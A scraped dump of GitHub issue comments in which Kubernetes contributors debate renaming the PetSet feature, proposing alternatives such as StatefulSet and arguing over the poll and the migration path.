kubernetes/kubernetes/27430/231603097,Aparna's list is awesome! My $0.02 vote is  PersistentSet NamedSet OrderedSet  We should consider primary use-cases of PetSet to choose name ,,False,False,27430
kubernetes/kubernetes/27430/231765883,"Here are a few more options  DistinctSet UniqueSet SuiSet (stateful uniquely identifiable; also a play on sui generis) PetSet, redefined as an abbreviation/backronym of PersistentSet (""Pe't"")  ",,False,False,27430
kubernetes/kubernetes/27430/231768523,I like this @friend ,,False,False,27430
kubernetes/kubernetes/27430/231811578,"So the features of Pet Set are based on identity and don't have to include Data existence.  I can have a stateless Pet Set of an application that required known identity for quorum.  I would ask to stay away from names that include references to other components like Persistent Volumes when you don't need a PV for a Pet Set. But back to @friend's point, should we focus on if we want to change the name to what the name should be on this issue?  @friend you mentioned that we have a procedure for naming stuff? ",,False,False,27430
kubernetes/kubernetes/27430/231835429,"I had suggested splitting so that we'd have a discussion about the bits independently, but I think it's fine to continue proposing ideas here. Generally this would go through the proposal process - we'd identify a list of names, people would register objections to the names, and then given the list of candidates try and remove outcomes that don't measure up based on the objections.  Once we've gone through that round, assuming we have a number of candidates that people feel strongly about, we'd try to refine them with general agreement amongst the API and proposal reviewers (with the API reviewers being final deciders). I'd probably argue that getting this name right is extremely important - important enough that we want to find a name that is good enough that all disagreement is resolved through strong arguments for why a name is best  It succinctly describes the core goal It is recognizable to a layman in the ""systems administration"" or ""web software"" fields as matching that core goal, and it would be best if explaining it can be done by simple analogy to something those users are already familiar with It ends with *Set We prefer descriptive names over ""cute"" names inasmuch as we're trying to describe a core pattern vs creating marketing material, keeping in mind patterns that can't be explained easily aren't good patterns.  I think most of those have already been stated here, and if folks want to continue brainstorming here please do so. On Mon, Jul 11, 2016 at 151 PM, Chris Love notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/232428634,"From the latest blog post  wat. I think this is a pretty good example of how ""pet"" isn't the right name for this even technically since a pet has a number of extra implications. ♠NamedSetIdentitySetPersistentSetPersistentSetNamedSet + (n * PersistentVolumeClaim)`. Also relevant re the blog post. This really needs to happen sooner rather than later or it's guaranteed to stick or at least be too complicated to change due to docs/issues/code that already references the current name. ",,False,False,27430
kubernetes/kubernetes/27430/232512518,"For completeness, names that have been proposed in the past that I don't see above include NominalSet, ShardSet, and IndexedSet. The distinguishing characteristics we want to convey were specified here  expand on the storage point The controller currently known as PetSet is unique among all the controllers in that it can instantiate and manage PVCs as well as pods, and, though it has other uses, the driving motivation for this controller is improved support for stateful workloads. ref #260, #18016, #3024 ",,False,False,27430
kubernetes/kubernetes/27430/232523281,"Another blog post has appeared which quite heavily uses the pets vs. cattle metaphor and makes it very clear that this is the derivation of the name of PetSet. Is there a way to communicate to the Kubernetes marketing team that a rename is being discussed? This kind of attention on the name PetSet is why I emphasized ""before release"" in the title of this issue. Thanks to everyone participating in the discussion to help find a more fitting name. ",,False,False,27430
kubernetes/kubernetes/27430/232529652,"Sets are unordered.  Lists, Arrays and Sequence all imply order and having indexes.  So, I don't get why it has to end in set.  I don't even think it is good for it to end in set. Which opens up  PodArray PodList PodSequence PetArray  uuh, no... wait, that last one doesn't work smirk    ",,False,False,27430
kubernetes/kubernetes/27430/232530065,"They aren't replicas, but they aren't totally different either.  There is only one template.  They all have to have the same PodSpec.  So, ""distinct"" or snowflake overemphasize the differences. ",,False,False,27430
kubernetes/kubernetes/27430/232530309,"It would be nice to capture that they are similar, and cooperate to fulfill a single purpose (what we would call a service if that name wasn't taken).  But they have numbers. Which leads me to the name ""Team"".  They work together, but they have numbers on the back of their jerseys so that you can tell them apart. ",,False,False,27430
kubernetes/kubernetes/27430/232531486,"Another thought While the dictionary definition of ""Replica"" is an identical copy.  But that is not how we use it in computer systems.  MySQL, which is a key motivating use case for PetSet, talks about the master and slave (yes, I know another offensive term), as both being replicas.  In fact, zookeeper and cassandra talk about replication and replication factors -- which I understand refers to specific data being replicated rather than instances, but all these apps that we are talking about running with PetSet, there is replication involved. So, what about  ReplicaList ReplicaVector ReplicaSequence ReplicaArray  I sort of like ReplicaArray best because array index is a thing, but list index, vector index, and sequence index are not so much things. I also like that it suggests some similarity with ReplicaSet. Also, the PetSet type has a  field in it, so, yeah. ",,False,False,27430
kubernetes/kubernetes/27430/232541730,"Team, Lineup, Ensemble, Cohort or Variants. I agree with @friend that the name needs to convey some degree of similarity rather than uniqueness. ",,False,False,27430
kubernetes/kubernetes/27430/232717586,Can someone change the name of this issue?  Release has already occurred ;) StatefulSet gets my vote. Or on the radical side PetSet ... just keep the darn name. ,,False,False,27430
kubernetes/kubernetes/27430/232737933,plus one to StatefulSet ,,False,False,27430
kubernetes/kubernetes/27430/232859167,"In my mind, the general use case that stands above the rest is that by contrast to all other pod deployment mechanisms this is the one that allows stateful pods. So my vote is for  - it is after all a set of states (thanks @friend for a great list); it sounds the best to me and is grammatically akin to ,  and ; but I would side with  as a next best option. Terms that start with ""Replica"" will be confusing next to . And names that make the indexing prominent don't describe why you would want to use pods that are indexed.  is a good suggestion, but ""Teamwork"" could also describe what ReplicaSets do. ",,False,False,27430
kubernetes/kubernetes/27430/233203824,"plus one for StatefulSet, @friend when reading your comment i was already confused by this, thinking it was already changed to ReplicaSet. Please do not pick a name that is too similar as it would be very easy to confuse the two (ReplicationController vs ReplicaSet vs ReplicaSequence ??? Very confusing to a beginner). ",,False,False,27430
kubernetes/kubernetes/27430/234353092,"plus one to ShardSet. A shard of a distributed database has a stable identity and associated persistent storage. Shards may added/removed from the system, but it is a non-trivial operation that requires careful planning and execution. This is the gist of a PetSet as I understand it. Also the terms ""shard"" / ""sharding"" are already familiar the intended users of this feature, which is IMO an advantage over more abstract names like OrderedSet, ReplicaVector. ",,False,False,27430
kubernetes/kubernetes/27430/234358050,I think ShardSet is a little too narrow because sharding is a subset of what PetSets do. PetSets allow the stateful representation of shards. PetSets are also for the stateful management of unsharded data like SQL master/slave replicas or etcd clusters where data is replicated but not sharded. As best as I can tell the commonality is statefulness. ,,False,False,27430
kubernetes/kubernetes/27430/234361631,"Agreed, but does ""StatefulSet"" make sense? Are the things in the set stateful, or the set itself? I think most people would assume the latter. ShardSet does not have this ambiguity. ""Replica"" has already been established as the identical, interchangeable kind in Kubernetes lingo, so I think using a different word is warranted for the replicas that have distinguishable identity. ",,False,False,27430
kubernetes/kubernetes/27430/235313550,I would say - keep PetSet and focus on something more important. There are already Masters/Slaves and BlackLists/WhiteLists and we live with it ) ,,False,False,27430
kubernetes/kubernetes/27430/235355156,"plus one for PetSet ShardSet or StatefulSet are not better than what we have now. On Tue, Jul 26, 2016 at 554 PM, wallverb notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/237046976,"I suspect the naming problem is actually a symptom of a design/hierarchy/abstraction problem from trying to add mid-layer functionality without breaking reverse compatibility of the existing layers. AFAIK, the distinguishing capability of PetSet is that it persists the IP and volumes of a container through resurrection/rescheduling of the container. This implies there may be a missing abstraction layer between replicator and container. For example, ignoring existing nomenclature, you could describe Clans as sets of Households that contain People, where the Clan describes a quantity of Households, the Household describes a named set of People, and the People can be either parents or children (expressing a two-level hierarchy of containers like a pod, where the parent namespaces network/disk/volumes for the children to share). The names that the Household uses to describe the People could then be configurable to either survive reincarnation (like PetSets) or not. If reincarnation is enabled, a replacement Person would get the same name/network/volumes as its predecessor. These names are probably not ideal either, but they hopefully they express how ReplicaSet and PetSet could exist in the same object hierarchy. ",,False,False,27430
kubernetes/kubernetes/27430/237061683,"The goals of an rc and petset are different. an rc is like a batallion of soldiers, they don't really know each other and as some die they're replaced asap. A petset is more like a family, they get names and startup/die in order. Obviously the soldiers can form a familiy, it would just be awkward, and the family can form an army, it would just be ineffective. The difference between an rc with reincarnation set to true and a petset is the latter provides an ordinal index, startup/teardown and a few other features designed to safeguard cluster membership. ",,False,False,27430
kubernetes/kubernetes/27430/237074159,"Those could be accounted for with feature flags, rather than being implicit features of the abstraction layer. Ordinal index is similar enough to a persistent name. Startup/teardown is something that would be nice to have on all containers/pods. ",,False,False,27430
kubernetes/kubernetes/27430/249395764,"I'm in love with this thread, as an example of the beauty of the open source process. @friend thank you for bravely (re)raising this issue. I agree 100%. I don't have much background in sociology to know fully the implications, but it seems worth every effort to try to reduce use of violent language, even when its impact would be subtle. A name change is insubstantial; people will get used to it. In fact, people may wonder why it was renamed and find this thread and make their first contact with the concept of the impact of language on animal welfare. =) plus one for StatefulSet. ",,False,False,27430
kubernetes/kubernetes/27430/254408188,"On naming This is not a Set. The members are ordered and indexed. I agree with @friend that it's an Array. So, . Deployment, Job, and DaemonSet are named according to use case, not according to mechanism. Therefore, names like NamedArray or IdentityArray are less than ideal. It's useful to be able to refer to the pods as instances of the group; for example, pods of DaemonSet are daemons, pods of ReplicaSet are replicas, and pods of Jobs are tasks. Pods of any collection with a name of the form AdjectiveArray would probably be called Adjective instances; for example, Stateful instances of a StatefulArray. To propose other alternatives for consideration (though I'm not in love with them) An individual is a distinct member of a group, potentially with some special quality. So, IndividualArray. It's a bit long, but still shorter than ReplicationController. Its pods would be individuals. InstanceArray could also work, would be shorter, and would be consistent with (though perhaps confused with) GCE Instance Groups. ",,False,False,27430
kubernetes/kubernetes/27430/254549576,"As Brian mentioned, a key differentiator on PetSet is that it is composed of unique-ish individuals working in concert with one another. Some alternatives to consider  Cohort (Pods = Individuals) This is short and a way of referring to a group of individuals working together   Concert (Pods = Individuals) Also short   CollaboratorArray (Pods = Collaborators) Also clearly defines the individual items as working together instead of independently   AssociatedArray (Pods = Associates) AssociateArray (Pods = Associates) PartnerArray (Pods = Partners)  ",,False,False,27430
kubernetes/kubernetes/27430/254551471,@friend @friend @friend You all interested in weighing in on the language aspects of naming? ,,False,False,27430
kubernetes/kubernetes/27430/254556184,"One other thought, I don't love the PetSet name for a completely different reason, which is that it implies these things are going to be a lot of work to maintain.  I'd rather have a name that indicates how they are managed differently than Deployments, but not that they are fundamentally require a lot of care and maintenance.  (though in some cases they might this isn't inherent to how we manage them) ",,False,False,27430
kubernetes/kubernetes/27430/254556457,@friend The name should ideally clearly distinguish the purpose from ReplicaSet. ,,False,False,27430
kubernetes/kubernetes/27430/254564204,OrdinalSet individuals could be called Ordinals; carries forward the set-suffix that some people like; emphasizes that the individuals have numbers. ,,False,False,27430
kubernetes/kubernetes/27430/254650496,On ordinal ,,False,False,27430
kubernetes/kubernetes/27430/254679673,"My vote for criteria we should use, extracted from  above Thus, plus one to StatefulSet or StatefulArray, even if you could technically use it for non-stateful things too. Re Set vs. Array, everything else is a Set, so I think departing from that convention adds more friction and thus cost than the benefits we'd gain from a more technically-precise name.  Again, see criteria above -- who are you optimizing for? ",,False,False,27430
kubernetes/kubernetes/27430/254682969,"Ok, since we are using the indices for sequencing, ordinal is more accurate than it was originally, and is less ambiguous than nominal. It is, however, less suggestive of the use case than Stateful or Persistent. However, while the primary use case is stateful applications, it's not the only use case. Similar to indexed jobs, the index could be used to distribute soft state  not ordinal, other terms that convey similar meaning that have been discussed are  a sequence is an enumerated collection of objects an array is an ordered arrangement  I think ""sequence"" is too strongly suggestive of ""sequential"". Lots of other naming considerations were discussed in #3024. ",,False,False,27430
kubernetes/kubernetes/27430/254683158,"On Set vs Array, another option is to drop those suffixes completely, along the lines of Deployment and Job. ",,False,False,27430
kubernetes/kubernetes/27430/254684542,"The basic difference between ReplicaSet and PetSet is that PetSet's members are denominated somehow, while ReplicaSet's are anonymous, right? ""Denominated"" is a mouthful, but other (shorter) synonyms for ""named"" might be appropriate. Re Set vs. Array I've seen ""collection"" used to good effect to describe a grouping of related things in no particular order (such as set) and that aren't guaranteed to be contiguous (like array). Just thoughts. On Oct 18, 2016 610 PM, ""Brian Grant"" notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/254685280,"Thanks, @friend. In this case, the members are ordered (sequential startup) and contiguous. ",,False,False,27430
kubernetes/kubernetes/27430/254686251,I agree with @friend about the main purpose. The API group is apps. We could use  or even just  (/apps/.../statefuls/). ,,False,False,27430
kubernetes/kubernetes/27430/254894589,"@friend - I have a concern with .  We will be answering tons of questions that say, ""No, you do not have to use a StatefulApp if you want to have a persistent volume attached to your application."". Much of the PM/user feedback we have got from the Red Hat side of the house is that ""State"" is a term that is too overloaded for this context.  We have had some users request ""MultiplexSet"" since it describes ""consisting of many elements in a complex relationship."" ",,False,False,27430
kubernetes/kubernetes/27430/254897917,plus one to @friend 's comment above about anything of the form Stateful* I think it's actually worse to be overly-specific than to be not-obvious-until-someone-explains-the-connection. ,,False,False,27430
kubernetes/kubernetes/27430/254911570,"@friend @friend I disagree. An obscure name won't help us. The name can help steer new users in the right direction, which can be hard to do with documentation alone. OTOH, we can explicitly state in all the relevant docs that all controllers and pods support PVCs/PVs, and the tradeoffs of using those other mechanisms (lack of fencing, lack of generating claims from a template, lack of multi-writer support on most block devices, etc.). Anyway, we're going to have a vote this afternoon. ",,False,False,27430
kubernetes/kubernetes/27430/254915684,"fyi, this email was just sent out to the kubernetes-dev mailing list regarding the vote. Dear Kubernetes Community, In version 1.3, we alpha released a feature called “PetSets” which enables stateful application support in Kubernetes.  After careful consideration and discussion with community members, we have decided to change the name of this feature “PetSets” (background  would like to have community members vote on a new name for PetSets.  Suggestions were received from community members and below is our final list of candidates.  Please note that we are not accepting any new names at this time and the community has decided that “PetSets” should not be one of the options.  The candidates for the new name are the following StatefulSet StatefulArray Stateful StatefulApp PersistentInstanceSet PersistentInstanceArray We have set up a ranked-choice voting poll below where you can rank the names in the order that you like here link The voting will be open until the end of day Monday 10/24/2016 midnight pacific time.  Please vote only one time. Please email me if you have any questions or concerns.  Thank you! Dan Paik danpaik@friend.com Kubernetes Product Manager ",,False,False,27430
kubernetes/kubernetes/27430/254915856,The names you've listed don't seem to correspond to any of the better suggestions that have been generated in the past.  Can you describe how you picked these names out of the suggestions above? ,,False,False,27430
kubernetes/kubernetes/27430/254920085,"We started by listing pretty much all of the suggestions that came in through this thread and then discussed each one on whether it was confusing with other features or technology (e.g. ReplicaSet, ShardSet) or sounded odd (IndividualSet), had potential for controversy, etc. and eliminated as we went down the list over a few rounds of discussion.  We also wanted to end up with a manageable list (&lt;10 options).  Many of the people on this thread were involved. ",,False,False,27430
kubernetes/kubernetes/27430/254923233,"It would have been good to do that slightly more transparently.  I was surprised by this, and I wasn't aware this was coming up. On Wed, Oct 19, 2016 at 346 PM, Dan Paik notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/254951254,"what's the proposed timeframe for the rename? pre-1.5? can we drop the alpha object completely, or will there be an attempt to maintain conversions from alpha petsets to objects with some other name? ",,False,False,27430
kubernetes/kubernetes/27430/254953998,"It is significantly harder to convert an entire type from alpha to beta than an annotation or field. We'd either need to autoconvert in apiserver or maintain 2 types, lock down edits to apps/v1alpha1, push the burden of converion on users, and teach the controller to understand both. I think we should drop on rename. ",,False,False,27430
kubernetes/kubernetes/27430/254959022,"Those were among the ones I was expecting to see in the poll, alongside remaining with PetSet On Oct 19, 2016, at 624 PM, Tim Hockin notifications@friend.com wrote IdentitySet or NominalSet or RoleSet. — You are receiving this because you commented. Reply to this email directly, view it on GitHub  mute the thread ",,False,False,27430
kubernetes/kubernetes/27430/254967110,"Ok, how about this?  I'll close the current poll and leave this thread here open for suggestions until 5pm tomorrow (Thursday 10/20).  At that time, I'll create a new poll and we can vote again. For additions to the current list, I have IdentitySet NominalSet RoleSet Regarding PetSet, from reading this thread it looks like the point is to change the name to something else.  Keeping it as an option would open up the possibility of not changing the name.  Thoughts? ",,False,False,27430
kubernetes/kubernetes/27430/254969322,How are we voting on this? ,,False,False,27430
kubernetes/kubernetes/27430/254970760,"Voting is currently closed but will re-open tomorrow at 5pm with a new link (that I'll post here as well as email out to kubernetes-dev@friend.com). If you have more suggestions, you can add them here. ",,False,False,27430
kubernetes/kubernetes/27430/254971328,"Thank you for deciding to vote on a new name. Obviously, I don't think keeping the current name should be an option. The technical work required to make the transition is largely a result of letting this issue sit open for so long. I opened the issue before PetSet was released as alpha, specifically so that it would be considered before the technical cost of changing became a bigger issue. Though there is precedent for leaving major features in alpha or beta for a long time to the point where they're de facto general availability (e.g. deployments), I don't think relying on anything about an alpha/beta feature is something we should encourage. They are alpha/beta for a reason things might change. ",,False,False,27430
kubernetes/kubernetes/27430/254994122,"We have pretty explicit guidelines about support for alpha/beta - Jordan's comments are reasonable because breaking people has cost, and we generally avoid breaking people at all because it is far more impactful than a name. In this case we will break people, and take the corresponding hit. On Wed, Oct 19, 2016 at 739 PM, Jimmy Cuadra notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/254994424,"While there are strong opinions about the naming, that doesn't mean that the opinion is shared among the community uniformly.  I suggested leaving PetSet in the poll because there are people who have expressed to me a preference for the name, just like there are people who have expressed that they are offended by the name, or prefer a more descriptive name.  I'd prefer to be inclusive to a wider set of opinions rather than exclusive here. On Wed, Oct 19, 2016 at 1037 PM, Clayton Coleman ccoleman@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/255007422,"I understand that some folks in the comminity would like to rename this software component. Frankly some people in the community would like to not rename it. Not having the option for voting to keep the name PetSet is not approaching this from the perspective of inclusion.  We are excluding people from the capability to vote to keep the name PetSet.  If we are a comminity we should allow all opinions to be heard. We need to be able to agree to disagree. Renaming the feature is understandable, excluding people for voting to keep the name is... Ah I digress. Also, what is the plan to re-educate people if the name does change? There is going to be a cost to companies that are already using this component. How is that going to be addressed? If this is renamed are we going to do a breaking change or deprecate? And lastly, why are we not using an online voting tool? Transparency is a beautiful thing. @friend who can address the above concerns? Again I do appreciate this community greatly. ",,False,False,27430
kubernetes/kubernetes/27430/255015024,Clayton's kubecon talk ) ,,False,False,27430
kubernetes/kubernetes/27430/255020241,I am thinking of calling my lightening talk at kubecon - The feature formerly named PetSet. In all seriousness it is an important question. Lots of people have been making Pets. ,,False,False,27430
kubernetes/kubernetes/27430/255022775,"A few quick responses 1) We are using an online voting tool with ranked-choice voting once we have the list of contenders.  Everyone can see the list of choices as well as what is winning (after they place a vote).  The link was in the original message earlier today with the initial set of vetted choices but was pulled in favor of allowing more community members to contribute more choices. 2) PetSets has some strong reaction from both sides so I'm trying to work through both groups of opinions that I'm getting on inclusion / exclusion.  I get the inclusion logic.  The exclusion logic is that it looks like from this thread that there is potential for it to be offensive so we should change it and not have it as an option. 3) As for implementing the change, the engineers working on this want to have a new name settled ASAP so that they can get to work on it and design it. 4) Since a lot of people have been making pets, if a change is going to be made it needs to be made now.  It looks like ideally we should have made the change sooner (before alpha launch) but we are where we are, etc. ",,False,False,27430
kubernetes/kubernetes/27430/255030366,"When we rename petsets, I expect that alpha support will be dropped. Kubernetes 1.4 will have apps.v1alpha1.petset. Kubernetes 1.5 will have apps.v1beta1.otherthing.  It won't have anything called petset and it won't remember your petset objects from when you were running 1.4. Users will need to GET and then DELETE their PetSets, edit the manifest and then upgrade their clusters to 1.5, and then POST the NewThing. It might seem simple to support two different names concurrently. However, based on experience with extensions.v1beta1.job and batch.v1.job and batch.v2alpha1.job, I do not believe we can do this in the time before 1.5. A key purpose of alpha is so that developers do not have to do headstands when they make a change that is difficult to make backward compatible.  Supporting the old name and the new name at the same time is going to require a headstand.   Feel free to prove me wrong with a PR. ",,False,False,27430
kubernetes/kubernetes/27430/255031358,"The only justification anyone has presented for keeping PetSet is the technical and educational cost of changing code and marketing material for a feature already being used by some people. I respect that, and think that is a very valid reason to consider not doing this, but I think the argument that not allowing people to vote for PetSet is ""excluding people's opinions"" is really putting energy into the wrong place. The goal here shouldn't be to support some perfect democracy for the sake of ""community."" The fact that there has been four months of discussion on the topic is community. @friend has already said that the Kubernetes team has decided to change it. Let's just do it and move on. ",,False,False,27430
kubernetes/kubernetes/27430/255034810,"I've followed the discussions on this and the other issue, and while there were a lot of thoughtful arguments made, it doesn't feel like we are converging.  So, further discussion doesn't make much sense.  And we have limited time for it before beta.  And I see getting to beta sooner as more valuable than having the best possible name. Several of the arguments for various names are about how words evoke certain ideas in the minds of our users.  Rather than postulating about what is in our user's minds, a poll seems like a good way to find out directly. Therefore, I asked Dan to conduct a poll. My intent in conducting a poll was not to determine whether or not PetSet is offensive.  I don't find it offensive, but I can see how reasonable people might find it offensive, and I don't think Kubernetes should offend even a small minority if it can reasonably be avoided.  Therefore, PetSet is not included in the poll. The purpose of the poll was to determine from among the not-known-to-be-offensive options, which one made the most sense to people. ",,False,False,27430
kubernetes/kubernetes/27430/255051393,"@friend issue is openned for PetSet transition / upgrade path.  users will need a path to migrate to the new objects, without downtime. ",,False,False,27430
kubernetes/kubernetes/27430/255080841,"Dan, On #2, how about adding an option for “Do not change” instead? Maybe slightly less biased. I’m not a professional pollster or statistician, but if someone knows one it wouldn’t be a bad idea to consult them. Ike ",,False,False,27430
kubernetes/kubernetes/27430/255088689,"Umm, all those changes that that kubernetes team and users of this feature will need to do (huge amount of time and money) is putting energy into the wrong place in my opinion. Correct - conducting a poll should be to determine if the name should stay or not - not including PetSet or Do not change anything option is WRONG and non transparent. Let the people vote if they want to invest time and money to do that change - unless you already decided that it will change - it's your product at the end. There always will be people that will be upset. ",,False,False,27430
kubernetes/kubernetes/27430/255160241,"@friend who can handle a PR on the questions that I have raised here I opened a PR on upgrades, and non-breaking changes, someone else needs to run with this one.  There are both education and marketing problems that we are creating.  We are creating technical debt for companies that have already used this tool. ",,False,False,27430
kubernetes/kubernetes/27430/255165742,"Surely whoever writes the PR should choose the new name?  It's thankless work, so the person that writes the PR should at least have that reward -) ",,False,False,27430
kubernetes/kubernetes/27430/255175380,The current list is.  Please let me know if you'd like to suggest another name. StatefulSet StatefulArray Stateful StatefulApp PersistentInstanceSet PersistentInstanceArray IdentitySet NominalSet RoleSet A new poll will be created later tonight (after 5pm). ,,False,False,27430
kubernetes/kubernetes/27430/255181641,"@friend Synopsis of PetSet for vote PetSet is a Kubernetes API resource type intended to facilitate deployment and management of stateful applications (e.g., databases, key-value stores) and other workloads that require distinct, stable network identities and/or storage for each instance  primarily distinguishes PetSet from other workload-management APIs in Kubernetes such as Deployment and DaemonSet is that the Pods it generates have predictable, stable names and that it can generate PersistentVolumeClaims in addition to Pods. ",,False,False,27430
kubernetes/kubernetes/27430/255189297,"@friend / @friend / @friend  who is the PM who manages priorities with PetSets from the google side of the house?  I know @friend is in the middle of this, but I am not sure who are the full list of owners.  Who at a product owner level owns this, and where is this work listed for this?  Are we talking about 1.5 a timeframe or beta timeframe?  When is 1.5? I would say that we need to update  is a blocker / and maybe a breaking item, and I am wondering if we should recommend pushing this out more.  The last thing that I want is this shoehorned in. This is getting people a tad upset.  Not doing this properly will cause C-Levels to break out torches and pitchforks. ",,False,False,27430
kubernetes/kubernetes/27430/255189684,"@friend did we lose PersistentSet deliberately? Also, I think not including PetSet as a choice risks prolonging this.  If we want to change the name soon, we should not exclude the option. ",,False,False,27430
kubernetes/kubernetes/27430/255205366,"Yes, ""Persistent.."" is shorter than ""PersistentInstance.."", please include it. ",,False,False,27430
kubernetes/kubernetes/27430/255218034,"1.5 code freeze is in 3 weeks (11/7) with the launch planned for December. I'm in the PM for Petsets on the Google side working with @friend. PersistentSet was changed to PersistentInstanceSet because PersistentSet is too general and can be confused with PersistentVolumes so ""Instance"" was added to remove some of the confusion. It does get to be harder and harder to change as time goes on so we're trying to get this done before beta.  We're trying to get PetSets into beta for 1.5. ",,False,False,27430
kubernetes/kubernetes/27430/255230955,"@friend is PM on the issue from Google, but, to be clear, this is a community and he/I/everyone here is just voting. We (at Google) don't ""own"" anything. We're just trying to close before 1.5. ",,False,False,27430
kubernetes/kubernetes/27430/255236276,"Here is the latest PetSet is a Kubernetes API resource type intended to facilitate deployment and management of stateful applications (e.g., databases, key-value stores) and other workloads that require distinct, stable network identities and/or storage for each instance  primarily distinguishes PetSet from other workload-management APIs in Kubernetes such as Deployment and DaemonSet is that the Pods it generates have predictable, stable names and that it can generate PersistentVolumeClaims in addition to Pods. Here are some potential alternate names for this resource type StatefulSet StatefulArray Stateful StatefulApp PersistentSet PersistentArray PersistentInstanceSet PersistentInstanceArray IdentitySet IdentityArray NominalSet NominalArray RoleSet RoleArray As for the inclusion of PetSets, a few people pointed out to me that they'd like it excluded citing the code of conduct as they find this offensive and not fostering an open and welcoming community.  maintainers have the right and responsibility to remove, edit, or reject comments, commits, code, wiki edits, issues, and other contributions that are not aligned to this Code of Conduct, or to ban temporarily or permanently any contributor for other behaviors that they deem inappropriate, threatening, offensive, or harmful.""  contributors and maintainers of this project, and in the interest of fostering an open and welcoming community, we pledge to respect all people who contribute through reporting issues, posting feature requests, updating documentation, submitting pull requests or patches, and other activities."" ",,False,False,27430
kubernetes/kubernetes/27430/255240434,"Where do we nominate alternative names? I'd like to nominate CatArray Reasoning cats are solitary, independent creatures with eccentric personalities. They are also particularly famous on the internet. The metaphor would be to contrast cats' evolutionary strategy with a school of fish, herds of bison, flocks of geese, etc which attempt to protect themselves from predators on the basis of their numbers. ",,False,False,27430
kubernetes/kubernetes/27430/255244399,"@friend you own your staffing and resource allocation )  We are on the same playing field.  Thanks for cleaning up what I said. @friend We probably need to take this discussion to another issue, please feel free to move it.  Does that mean in 1.5 the name is changing? ",,False,False,27430
kubernetes/kubernetes/27430/255247431,"In this case I demand immediate removal of all the references to that words that are extremely harmful/offensive/inappropriate to people with afro-american roots. This means - removal of all words that contain 'master', 'slave', 'black' (as being something worse) and 'white' (as being something better) in the context of 'master-slaves', 'whitelists', 'blacklists', 'black holes' etc. Here are the links that are part of the kubernetes project that are harmful  stated by OP I am not Just trying to talk common sense. but if we want to be super a**lretentive then my statement is equally (if not more) appropriate - as they concern humans. ",,False,False,27430
kubernetes/kubernetes/27430/255248582,@friend That is a reasonable request but should probably be opened as a separate issue. You can reference this one for context. ,,False,False,27430
kubernetes/kubernetes/27430/255251266,"Please stop.  Derailing the conversation with additional demands does not help us resolve this issue of what to change the name to.  We have had multiple requests for varying reasons to change the name of this feature. If you have ideas for names that represent the feature succinctly and are not intended to be humorous or sarcastic we welcome your contributions.  if not, your comments are a distraction to an already complicated debate. ",,False,False,27430
kubernetes/kubernetes/27430/255256169,@friend and @friend I added some postscript above to clarify that my proposal is serious. Also thank to you both for doing a great job thus far with a very complex and sensitive situation. I am impressed with your patience during this process! ,,False,False,27430
kubernetes/kubernetes/27430/255258557,@friend / @friend when is voting again.  Asking for interested developers. ,,False,False,27430
kubernetes/kubernetes/27430/255258773,Dan had said he'd post a new poll at 5 PM (assuming Pacific.) Should be up in just a few minutes. ,,False,False,27430
kubernetes/kubernetes/27430/255258775,"Voting will start up again later tonight.  I'll put a link here when it's ready.  There are still some discussions going on so we'll see if this thread gets updated with more thought but if not, I'll collect everything and create a new poll for voting. ",,False,False,27430
kubernetes/kubernetes/27430/255260382,"@friend Hey Erick -- This is a community, so you have a right to do whatever you'd like, but I would like to implore you to withdraw CatArray. In my opinion, the primary reason to change the name is not the initial reason that was proposed in this thread, but that PetSet is cute and totally indecipherable by anyone who does not understand the Pets v. Cattle analogy. CatArray falls into this camp. ",,False,False,27430
kubernetes/kubernetes/27430/255261230,"I would like to add that I'm uncomfortable with having to understand the behaviour of cats, dogs, cows, and other animals in order to grasp a technical concept in Kubernetes. Its maybe obvious to people who are familiar with animal behavior but I think many people are not. Also I really don't like thinking about killing and predators and violence and so forth unless I have to. Just a personal opinion. ",,False,False,27430
kubernetes/kubernetes/27430/255261495,"@friend and the window will close when?  I assume this is going to be the ""vote"" and we are not going to do this again.  We need to put this to bed.  This is turning into an optics nightmare. ",,False,False,27430
kubernetes/kubernetes/27430/255262380,I'll create a poll today (having some issues with the website that creates the poll) and the voting window will close on Monday 10/24/2016 at midnight. I'd like to leave CatArray off the list. ,,False,False,27430
kubernetes/kubernetes/27430/255262407,"@friend Not sure where you are getting this from - but there is nothing humorous / sarcastic in whatever I posted. This is very serious matter. Is there a double standard ? My point is - there is NOTHING harmful in  name - there is not even a single mention of  in that name. If the  metaphor is harmful - then just change that 3 (or more) articles that kubernetes team posted about it - and just describe PetSet as things that you 'know about, name, know every charactersistc of them, have handful of them' or whatever. Just let people to vote for that - as I said - because there is nothing hateful in name itself 'PetSet'. There is a lot of effort and money spent by both kubernetes team and users - that at least they should have a chance to vote on that. ",,False,False,27430
kubernetes/kubernetes/27430/255262889,@friend thanks for letting us know that is was sarcasm.  People are taking this a tad serious. ,,False,False,27430
kubernetes/kubernetes/27430/255263255,@friend Thanks for the answer - but as I said - it wasn't a sarcasm. I'm also taking it very seriously. ,,False,False,27430
kubernetes/kubernetes/27430/255264148,"I agree that CatArray is a cute name, and if the goal is to avoid cute names you can exclude it from the poll. ",,False,False,27430
kubernetes/kubernetes/27430/255265801,"Thank you everyone! I create a new poll.  The link is below.  I will also share this link in the kubernetes-dev@ email list and the slack channel tomorrow.  let me know if you think anything is incorrect, etc.  Thanks again. ",,False,False,27430
kubernetes/kubernetes/27430/255286132,"Have we considered the abbreviations for each of these?  RoleSet = rs, which is already taken by replicasets.  StatefulApp &amp; StatefulArray  = sa = serviceacount. NominalSet = ns = namespace.   Some of the alternatives also have unfortunate abbreviations.  I can't see StatefulSet being an acceptable choice, as a particular example. ",,False,False,27430
kubernetes/kubernetes/27430/255287042,@friend well we can only hope StatefulSet does not win. But we can be creative with the abbreviations as well ,,False,False,27430
kubernetes/kubernetes/27430/255320828,"I'm not a fan of ""Stateful"". It seems orthogonal to the problem currently solved by petset. Cassandra and gnatsd are examples of applications that are highly stateful and run just as well in a replicaset as they do in a petset. HDFS datanode is a highly stateful app that is suited to run as a daemonset. A petset might also be used to partition work between a group of stateless workers where the partitioning is decided by the pet's index. Stateful is a common but not defining characteristic of applications that run well in ""petsets"". There are stateful apps that are not suited for petsets. There are stateless apps that are suited for petsets. ",,False,False,27430
